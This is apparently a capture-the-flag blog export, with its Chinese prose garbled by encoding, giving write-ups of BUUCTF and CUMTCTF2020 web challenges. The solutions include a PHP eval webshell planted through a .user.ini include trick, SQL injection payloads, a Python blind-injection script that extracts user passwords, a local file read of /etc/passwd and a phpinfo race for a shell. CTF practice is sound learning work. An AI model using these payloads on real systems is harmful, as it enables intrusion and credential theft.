<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## [æå®¢å¤§æŒ‘æˆ˜ 2019]Http</span><br><span class="line"></span><br><span class="line">æ”¹è¯·æ±‚åŒ…xffï¼Œuaï¼Œrefã€‚</span><br></pre></td></tr></table></figure>
<p>GET /Secret.php HTTP/1.1<br>Host: node3.buuoj.cn:28918<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 Syclover<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br>referer: <a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a><br>X-Forwarded-for: 127.0.0.1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># æ–‡ä»¶ä¸Šä¼ </span><br><span class="line"></span><br><span class="line">## [SUCTF 2019]CheckInï¼ˆ.user.iniï¼‰</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Upload Labs&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Upload Labs&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;label for&#x3D;&quot;file&quot;&gt;æ–‡ä»¶åï¼š&lt;&#x2F;label&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;fileUpload&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;upload&quot; value&#x3D;&quot;æäº¤&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; error_reporting(0);</span><br><span class="line">$userdir &#x3D; &quot;uploads&#x2F;&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); &#x2F;&#x2F;è¿™ä¸ªæ˜¯åˆå§‹ç›®å½•</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, 0777, true); &#x2F;&#x2F;å¦‚æœä¸å­˜åœ¨ï¼Œå°±å°†åˆ›å»ºç›®å½•å¯å†™å¯æ‰§è¡Œ</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . &quot;&#x2F;index.php&quot;, &quot;&quot;);</span><br><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    $tmp_name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];</span><br><span class="line">    if (!$tmp_name) &#123;  &#x2F;&#x2F;åˆ¤æ–­æ˜¯å¦å­˜åœ¨ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">        die(&quot;filesize too big!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!$name) &#123;  &#x2F;&#x2F;æ–‡ä»¶åä¸è®¸ä¸ºç©º</span><br><span class="line">        die(&quot;filename cannot be empty!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension &#x3D; substr($name, strrpos($name, &quot;.&quot;) + 1); &#x2F;&#x2F;æˆªå–åç¼€å</span><br><span class="line">    if (preg_match(&quot;&#x2F;ph|htacess&#x2F;i&quot;, $extension)) &#123;</span><br><span class="line">        die(&quot;illegal suffix!&quot;);  &#x2F;&#x2F;æ­£åˆ™åŒ¹é…ï¼Œphå’Œhtaccesséƒ½ä¸å¯ä»¥</span><br><span class="line">    &#125;</span><br><span class="line">    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !&#x3D;&#x3D; FALSE) &#123;</span><br><span class="line">        die(&quot;&lt;? in contents!&quot;);  &#x2F;&#x2F;æ–‡ä»¶å†…å®¹ä¸è®¸æœ‰&lt;?</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type &#x3D; exif_imagetype($tmp_name);  &#x2F;&#x2F;åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹</span><br><span class="line">    if (!$image_type) &#123;</span><br><span class="line">        die(&quot;exif_imagetype:not image!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path &#x3D; $userdir . &quot;&#x2F;&quot; . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    echo &quot;Your dir &quot; . $userdir. &#39; &lt;br&gt;&#39;;</span><br><span class="line">    echo &#39;Your files : &lt;br&gt;&#39;;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>æºç å¦‚ä¸Šï¼Œå¯ä»¥å­¦ä¹ ä¸€ä¸‹</p>
<p><strong>å…¶ä¸­exif_imagetype()å¯ä»¥è®°å½•ä¸€ä¸‹</strong></p>
<blockquote>
<p>ä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡ç»™ä¸Šä¼ è„šæœ¬åŠ ä¸Šç›¸åº”çš„å¹»æ•°å¤´å­—èŠ‚å°±å¯ä»¥ç»•è¿‡ï¼š</p>
<ul>
<li>JPG ï¼šFF D8 FF E0 00 10 4A 46 49 46</li>
<li>GIF(ç›¸å½“äºæ–‡æœ¬çš„GIF89a)ï¼š47 49 46 38 39 61</li>
<li>PNGï¼š 89 50 4E 47</li>
</ul>
</blockquote>
<p>è¿™é‡Œæƒ³è¦ä¸Šä¼ æˆåŠŸï¼Œè¦å€ŸåŠ©ä¸€ä¸‹.user.ini</p>
<blockquote>
<p><a href="https://wooyun.js.org/drops/user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
<p>.user.iniå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€œè‡ªå®šä¹‰â€çš„php.iniï¼Œæˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯æ¨¡å¼ä¸ºâ€œPHP_INI_PERDIR ã€ PHP_INI_USERâ€çš„è®¾ç½®ã€‚ï¼ˆä¸Šé¢è¡¨æ ¼ä¸­æ²¡æœ‰æåˆ°çš„PHP_INI_PERDIRä¹Ÿå¯ä»¥åœ¨.user.iniä¸­è®¾ç½®ï¼‰</p>
<p>å…¶ä¸­æœ‰ä¸¤ä¸ªé…ç½®ï¼Œå¯ä»¥ç”¨æ¥åˆ¶é€ åé—¨ï¼š<br>auto_append_fileã€auto_prepend_file<br>æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œauto_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;auto_prepend_file&#x3D;test.jpg</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆå½“æˆ‘ä»¬è®¿é—®æ­¤ç›®å½•ä¸‹çš„ä»»ä½•ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå»åŒ…å«test.jpg</p>
<p>å¸¸è§å§¿åŠ¿ï¼š</p>
<p>æ¯”å¦‚ï¼ŒæŸç½‘ç«™é™åˆ¶ä¸å…è®¸ä¸Šä¼ .phpæ–‡ä»¶ï¼Œä½ ä¾¿å¯ä»¥ä¸Šä¼ ä¸€ä¸ª.user.iniï¼Œå†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼ŒåŒ…å«èµ·æ¥è¿›è¡Œgetshellã€‚ä¸è¿‡å‰ææ˜¯å«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹éœ€è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶ï¼Œå¦åˆ™ä¹Ÿä¸èƒ½åŒ…å«äº†ã€‚ </p>
</blockquote>
<p>è¿™é‡Œæœ€åå°±è¦å†™ä¸€ä¸ªå›¾ç‰‡é©¬äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>ç„¶åæŠŠä¸¤ä¸ªä¸Šä¼ ï¼Œè¿èœåˆ€å°±å¯ä»¥æ‹¿åˆ°flagäº†</p>
<p><strong>ä¸»è¦æ¥å­¦ä¹ ä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ çš„æ“ä½œ</strong></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p>è¿™ä¸ªç›´æ¥ä¸Šä¼ å°±å¯ä»¥ï¼Œæ”¹ä¸€ä¸‹æ–‡ä»¶å†…å®¹çš„å¤´ï¼Œç„¶åæ”¹ä¸‹æ–‡ä»¶åphtml</p>
<p>èœåˆ€è¿æ¥æ‹¿flag</p>
<h2 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>å¤‡ä»½æ–‡ä»¶index.php.bak</p>
<p>ä¸¤ä¸ªç­‰å·å¼±ç­‰äºï¼Œç›´æ¥123æ‹¿flag</p>
<h2 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h2><p>ä¸Šä¼ æ”¹åå­—ï¼Œæ‹¿flag</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Knife"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h2><p>ç›´æ¥èœåˆ€è¿æ¥ï¼Œæ ¹ç›®å½•ä¸‹æœ‰flag</p>
]]></content>
      <categories>
        <category>BUU</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>åˆ·é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title>CUMTCTF2020</title>
    <url>/2020/09/25/CUMTCTF2020/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="CUMTCTF2020"><a href="#CUMTCTF2020" class="headerlink" title="CUMTCTF2020"></a>CUMTCTF2020</h1><p>ç¬¬ä¸€æ¬¡æ‰“æ¯”èµ›ï¼Œå¤§ä¸‰çš„å¸ˆå‚…ä»¬å¥½å¼º</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Webç­¾åˆ°"><a href="#Webç­¾åˆ°" class="headerlink" title="Webç­¾åˆ°"></a>Webç­¾åˆ°</h2><p><img src="/2020/09/25/CUMTCTF2020/image-20200925183359837.png" alt="image-20200925183359837"></p>
<p>getä¼ å…¥å‚æ•°1ï¼Œpostä¼ å…¥å‚æ•°2ï¼Œç„¶åæ–‡ä»¶åŒ…å«flag.phpï¼ŒæŸ¥çœ‹æºç æ‹¿flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#CUMTCTF&#123;179055b4-e8f5-42d2-bfe4-027d15e946b2&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Babysqli"><a href="#Babysqli" class="headerlink" title="Babysqli"></a>Babysqli</h2><p>è¿‡æ»¤ç©ºæ ¼çš„sqlæ³¨å…¥ï¼Œå¯ä»¥ç”¨/**/ç»•è¿‡,ç”¨unionæ³¨å…¥</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#æŸ¥è¡¨</span><br><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),5,6,7,8#</span><br><span class="line">#emails,users</span><br><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;emails&#39;),5,6,7,8#</span><br><span class="line">#id,email_id</span><br><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;users&#39;),5,6,7,8#</span><br><span class="line">#user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br><span class="line">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,(select&#x2F;**&#x2F;group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;users),5,6,7,8#</span><br><span class="line">#CUMTCTF&#123;27ec8034-c9fe-0cfd-d92a-84362ecf0e42&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;secret.jpg</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥çœ‹å›¾ç‰‡çš„æºä»£ç ï¼Œå‘ç°åé¢æœ‰php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'param1'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $str1=$_GET[<span class="string">'param1'</span>];</span><br><span class="line">    <span class="keyword">if</span>(file_get_contents($str1)!==<span class="string">'Suvin_wants_a_girlfriend'</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Suvin doesn't like you"</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">        $str2=$_GET[<span class="string">'param2'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($str2))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Suvin prefers strings of Numbers'</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>($str2&lt;<span class="number">3600</span>*<span class="number">24</span>*<span class="number">30</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Suvin says the num is too short'</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>($str2&gt;<span class="number">3600</span>*<span class="number">24</span>*<span class="number">31</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Suvin says the num is too long'</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Suvin says he's falling in love with you!"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            sleep(intval($str2)); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'param1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'param2'</span>])) &#123;</span><br><span class="line">            $str1=$_POST[<span class="string">'param1'</span>];</span><br><span class="line">            $str2=$_POST[<span class="string">'param2'</span>];</span><br><span class="line">            <span class="keyword">if</span>(strlen($str1)&gt;<span class="number">1000</span>)</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"It's too long"</span>);</span><br><span class="line">            <span class="keyword">if</span>(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"It's so similar to md5"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆgetä¼ å…¥param1è¦å’Œä¸€ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰å¯ä»¥ç”¨data://</p>
<p>getä¼ å…¥param2è¦åˆ¤æ–­è¿™ä¸ªå‚æ•°æ˜¯å¦æ˜¯æ•°å­—å¹¶ä¸”è¦é™åˆ¶äº†èŒƒå›´ï¼Œåœ¨åŠ ä¸Šæœ‰sleepï¼Œå¾ˆè‡ªç„¶çš„å°±æƒ³åˆ°äº†ç§‘å­¦è®¡æ•°æ³•</p>
<p>å› æ­¤payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.197:13005&#x2F;index.php?param2&#x3D;0.26e07&amp;param1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Suvin_wants_a_girlfriend</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥æ˜¯postçš„ä¸¤ä¸ªå‚æ•°è¦çš„æ˜¯å­—ç¬¦ä¸²ä¸‹çš„å‚æ•°1å’Œå‚æ•°2ä¸å¼ºç­‰ï¼Œä½†sha1åŠ å¯†å¼ºç­‰ï¼Œè¿™é‡Œå°±ä¸èƒ½ç”¨zheæ•°ç»„ç»•è¿‡äº†</p>
<p>è¿™é‡Œæ‰¾ä¸¤ä¸ªsha1åŠ å¯†çš„ä¸ä¸€æ ·çš„å­—ç¬¦ä¸²,æ‰¾çš„æ˜¯é‚£ä¸ªpdfï¼Œç„¶åæå–å‰é¢çš„å†…å®¹å³å¯ï¼Œæœ€åæŠ“åŒ…æ”¹å‚æ•°1å’Œå‚æ•°2æ‹¿flag</p>
<p><img src="/2020/09/25/CUMTCTF2020/image-20200925185006355.png" alt="image-20200925185006355"></p>
<h2 id="Babysqli2"><a href="#Babysqli2" class="headerlink" title="Babysqli2"></a>Babysqli2</h2><p>è¿‡æ»¤äº†<strong>å•å¼•å·å’Œå­—ç¬¦ä¸²æˆªæ–­å‡½æ•°substr()å’Œmid()</strong>å¹¶ä¸”æ— å›æ˜¾ï¼Œå› ä¸ºæœ‰æ­£ç¡®å’Œé”™è¯¯ç™»å½•ç•Œé¢é‚£åº”è¯¥å°±æ˜¯ç›²æ³¨äº†</p>
<p>è¿™é‡Œç”¨leftæ¥æˆªå–å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ç”¨åå…­è¿›åˆ¶æ¥æ›¿æ¢å•å¼•å·åŠå…¶é‡Œé¢çš„å†…å®¹</p>
<p>ç›´æ¥æ”¾è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#dict = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.-&#123;&#125;,'</span></span><br><span class="line">dict=<span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">url = <span class="string">'http://202.119.201.197:13004/index.php'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">j = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">400</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> dict:</span><br><span class="line">        <span class="comment">#payload = "or/**/1=(case/**/when/**/(left(database(),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#".format(i, binascii.b2a_hex(j + a))</span></span><br><span class="line">        <span class="comment">#payload = "or/**/1=(case/**/when/**/(left((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#".format(i,binascii.b2a_hex(j+a))</span></span><br><span class="line">        <span class="comment">#payload = "or/**/1=(case/**/when/**/(left((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x7573657273),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#".format(i,binascii.b2a_hex(j + a))</span></span><br><span class="line">        payload = <span class="string">"or/**/1=(case/**/when/**/(left((select/**/group_concat(password)/**/from/**/users),&#123;&#125;)=0x&#123;&#125;)/**/then/**/1/**/else/**/0/**/end)#"</span>.format(i, binascii.b2a_hex(j + a))</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        <span class="comment">#cumtctf</span></span><br><span class="line">        <span class="comment">#emails users</span></span><br><span class="line">        <span class="comment">#id id username,password</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span> : <span class="string">"100\\"</span>,</span><br><span class="line">            <span class="string">'password'</span> : payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.session()</span><br><span class="line">        res = r.post(url=url,data=data)</span><br><span class="line">        <span class="comment">#print(res.content)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Wrong username'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            j += a</span><br><span class="line">            flag +=a</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
<p>å¥½åƒæ˜¯åœ¨æœ€åï¼Œå¤šè·‘ä¸€ä¼šå°±å‡ºæ¥äº†</p>
<h2 id="Try-GET-file"><a href="#Try-GET-file" class="headerlink" title="Try:GET_file"></a>Try:GET_file</h2><p>å…ˆæ‰«ç›®å½•å‘ç°æœ‰phpinfo.php</p>
<p>åŒ…å«ä¸€ä¸‹å‘ç°æœ‰æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p>ä¹‹ååˆåŒ…å«æ•æ„Ÿæ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/25/CUMTCTF2020/image-20200925185651724.png" alt="image-20200925185651724"></p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªphpinfoä¸Šä¼ æ–‡ä»¶å†åŒ…å«</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åœ¨ç»™PHPå‘é€POSTæ•°æ®åŒ…æ—¶ï¼Œå¦‚æœæ•°æ®åŒ…é‡ŒåŒ…å«æ–‡ä»¶åŒºå—ï¼Œæ— è®ºè®¿é—®çš„ä»£ç ä¸­æ˜¯å¦æœ‰å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ï¼Œphpéƒ½ä¼šå°†è¿™ä¸ªæ–‡ä»¶ä¿å­˜æˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯&#x2F;tmp&#x2F;php[6ä¸ªéšæœºå­—ç¬¦]ï¼‰ï¼Œè¿™ä¸ªä¸´æ—¶æ–‡ä»¶åœ¨è¯·æ±‚ç»“æŸåå°±ä¼šè¢«åˆ é™¤ï¼ŒåŒæ—¶ï¼Œphpinfoé¡µé¢ä¼šå°†å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰å˜é‡éƒ½æ‰“å°å‡ºæ¥ã€‚ä½†æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´å’Œphpinfoé¡µé¢é€šå¸¸æ˜¯ä¸¤ä¸ªé¡µé¢ï¼Œç†è®ºä¸Šæˆ‘ä»¬éœ€è¦å…ˆå‘é€æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œç„¶åä»è¿”å›é¡µé¢ä¸­åŒ¹é…å‡ºä¸´æ—¶æ–‡ä»¶åï¼Œå°†è¿™ä¸ªæ–‡ä»¶åå‘é€ç»™æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢ã€‚</span><br><span class="line"></span><br><span class="line">å› ä¸ºåœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚ç»“æŸæ—¶ï¼Œä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«åˆ é™¤ï¼Œç¬¬äºŒä¸ªè¯·æ±‚å°±æ— æ³•è¿›è¡ŒåŒ…å«ã€‚</span><br><span class="line"></span><br><span class="line">ä½†æ˜¯è¿™å¹¶ä¸ä»£è¡¨æˆ‘ä»¬æ²¡æœ‰åŠæ³•å»åˆ©ç”¨è¿™ç‚¹ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œåªè¦å‘é€è¶³å¤Ÿå¤šçš„æ•°æ®ï¼Œè®©é¡µé¢è¿˜æœªååº”è¿‡æ¥ï¼Œå°±ä¸Šä¼ æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶ï¼Œç„¶åæ–‡ä»¶åŒ…å«ï¼š</span><br><span class="line"></span><br><span class="line">1ï¼‰å‘é€åŒ…å«äº†webshellçš„ä¸Šä¼ æ•°æ®åŒ…ç»™phpinfoï¼Œè¿™ä¸ªæ•°æ®åŒ…çš„headerï¼Œgetç­‰ä½ç½®ä¸€å®šè¦å¡æ»¡åƒåœ¾æ•°æ®ï¼›</span><br><span class="line"></span><br><span class="line">2ï¼‰phpinfoè¿™æ—¶ä¼šå°†æ‰€æœ‰æ•°æ®éƒ½æ‰“å°å‡ºæ¥ï¼Œå…¶ä¸­çš„åƒåœ¾æ•°æ®ä¼šå°†phpinfoæ’‘å¾—éå¸¸å¤§</span><br><span class="line"></span><br><span class="line">3ï¼‰PHPé»˜è®¤ç¼“å†²åŒºå¤§å°æ˜¯4096ï¼Œå³PHPæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥</span><br><span class="line"></span><br><span class="line">4ï¼‰æ‰€ä»¥ï¼Œæˆ‘ä»¬ç›´æ¥æ“ä½œåŸç”Ÿsocketï¼Œæ¯æ¬¡è¯»å–4096ä¸ªå­—èŠ‚ï¼Œåªè¦è¯»å–åˆ°çš„å­—ç¬¦é‡ŒåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œå°±ç«‹å³å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ…</span><br><span class="line"></span><br><span class="line">5ï¼‰æ­¤æ—¶ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„socketè¿æ¥å…¶å®è¿˜æ²¡æœ‰ç»“æŸï¼Œä½†æ˜¯PHPè¿˜åœ¨ç»§ç»­æ¯æ¬¡è¾“å‡º4096ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸´æ—¶æ–‡ä»¶è¿˜æœªè¢«åˆ é™¤</span><br><span class="line"></span><br><span class="line">6ï¼‰æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼ŒæˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€ågetshell</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæœ‰ç°æˆçš„exp</p>
